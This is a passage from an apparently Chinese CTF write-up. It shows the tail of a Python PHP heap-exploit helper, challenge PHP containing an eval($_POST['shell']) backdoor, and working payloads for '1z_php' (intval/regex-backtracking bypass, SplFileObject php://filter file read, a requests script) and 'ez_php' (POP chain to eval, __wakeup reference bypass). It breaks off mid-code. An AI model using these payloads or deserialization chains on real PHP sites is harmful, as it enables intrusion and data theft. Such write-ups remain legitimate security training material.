class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns data suitable for `zlib.inflate`.    """</span>    <span class="token comment"># Remove 2-byte header and 4-byte checksum</span>    <span class="token keyword">return</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">b64</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> misalign <span class="token keyword">and</span> payload<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Misaligned: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compressed_bucket</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns a chunk of size 0x8000 that, when dechunked, returns the data."""</span>    <span class="token keyword">return</span> chunked_chunk<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">qpe</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Emulates quoted-printable-encode.    """</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ptr_bucket</span><span class="token punctuation">(</span><span class="token operator">*</span>ptrs<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Creates a 0x8000 chunk that reveals pointers after every step has been ran."""</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">==</span> size    bucket <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>p64<span class="token punctuation">,</span> ptrs<span class="token punctuation">)</span><span class="token punctuation">)</span>    bucket <span class="token operator">=</span> qpe<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    <span class="token keyword">return</span> bucket<span class="token keyword">def</span> <span class="token function">chunked_chunk</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    """</span>    <span class="token comment"># The caller does not care about the size: let's just add 8, which is more than</span>    <span class="token comment"># enough</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>    keep <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"\n\n"</span><span class="token punctuation">)</span>    size <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>size <span class="token operator">-</span> keep<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> size<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span> <span class="token operator">+</span> data <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Region</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A memory region."""</span>    start<span class="token punctuation">:</span> <span class="token builtin">int</span>    stop<span class="token punctuation">:</span> <span class="token builtin">int</span>    permissions<span class="token punctuation">:</span> <span class="token builtin">str</span>    path<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>stop <span class="token operator">-</span> self<span class="token punctuation">.</span>startExploit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="justread.png" loading="lazy"></p><p><img src="justread2.png" loading="lazy"></p><h4 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 我记得她...好像叫flag.php吧？</span><span class="token variable">$emp</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_m.p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$try</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'try'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token operator">!=</span><span class="token string double-quoted-string">"114514"</span><span class="token operator">&amp;&amp;</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你不是hacker？那请去外场等候！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"只有真正的hacker才能拿到flag！"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?HACKER/is'</span><span class="token punctuation">,</span><span class="token variable">$try</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你是hacker还敢自报家门呢？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$try</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'HACKER'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你连自己是hacker都不承认，还想要flag呢？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"收手吧hacker，你得不到flag的！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"114514到底是啥意思嘞？。？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span><span class="token variable">$shell</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>114514到底是啥意思嘞？。？</code></pre><ol><li><strong>intval</strong> 有一个特性。输入的值如果是字符串，它返回的内容取决于第一个字符左侧的数字。如 intval(‘11a22’)&#x3D;11。</li><li><strong>ctype_alpha</strong> — 做纯字符检测。——如果在当前语言环境中 text 里的每个字符都是一个字母，那么就返回true，反之则返回false。</li><li><strong>regexp</strong> 最大回溯</li><li>php 原生类</li></ol><p>Payload:</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">GET</span><span class="token punctuation">:</span> <span class="token header-value">?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString</span></span><span class="token header"><span class="token header-name keyword">POST</span><span class="token punctuation">:</span> <span class="token header-value">"hsad"*1000000+"HACKER"</span></span></code></pre><p>也可以python一把梭</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://challenge.basectf.fun:48615/"</span>params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"e[m.p"</span><span class="token punctuation">:</span> <span class="token number">114514.1</span><span class="token punctuation">,</span>    <span class="token string">"a"</span><span class="token punctuation">:</span> <span class="token string">"SplFileObject"</span><span class="token punctuation">,</span>    <span class="token string">"b"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">,</span>    <span class="token string">"c"</span><span class="token punctuation">:</span> <span class="token string">"__toString"</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"try"</span><span class="token punctuation">:</span> <span class="token string">"hsad"</span><span class="token operator">*</span><span class="token number">250001</span><span class="token operator">+</span><span class="token string">"HACKER"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># flag = "PD9waHAgPUJhc2VDVEZ7YWZhYzU2NjYtZWI2Yy00MGQ5LWJmMTUtYmQyYmY4OTk1MmQwfT8+Cg=="</span><span class="token comment"># decoded_flag = base64.b64decode(flag)</span><span class="token comment"># print(decoded_flag)</span></code></pre><h4 id="ez-php-gc回收，引用绕过，反序列化逃逸"><a href="#ez-php-gc回收，引用绕过，反序列化逃逸" class="headerlink" title="ez_php(gc回收，引用绕过，反序列化逃逸)"></a>ez_php(gc回收，引用绕过，反序列化逃逸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$end</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Hacker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$end</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">=</span><span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfer/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hacker！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"C"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">T</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">F</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token property">f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">E</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$e</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">e</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">R</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$r</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ez_ser.from_you'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&#123;&#123;&#123;'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ez_ser.from_you'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&#125;&#125;&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\[|\]/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NONONO!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$pre</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"substr"</span><span class="token punctuation">;</span>    <span class="token variable">$ser_ctf</span> <span class="token operator">=</span> <span class="token function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$pre</span><span class="token operator">.</span><span class="token string double-quoted-string">"["</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser_ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"杂鱼~杂鱼~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>先是pop链子</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Hacker</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">C</span><span class="token operator">::</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">T</span><span class="token operator">::</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">F</span><span class="token operator">::</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">E</span><span class="token operator">::</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">R</span><span class="token operator">::</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>接着是绕 <code>__wakeup</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>下边有一个赋值的操作，所以可以使用引用绕过，当<code>end</code>和<code>username</code>相互引用时，修改<code>end</code>的值也是在修改<code>username</code>的值。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span></code></pre><p>接着是绕过<code>throw new Exception(&quot;杂鱼~杂鱼~&quot;);</code>，这里有一个异常抛出，使得<code>__destruct</code>并不能触发，这时就需要使用gc回收的机制，使<code>__destruct</code>提前触发，让<code>pop</code>链能够往后走</p><p>参考连接：<a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a></p><p>Pop:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Hacker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$end</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">T</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$t</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">F</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">E</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$e</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">e</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">R</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$r</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token 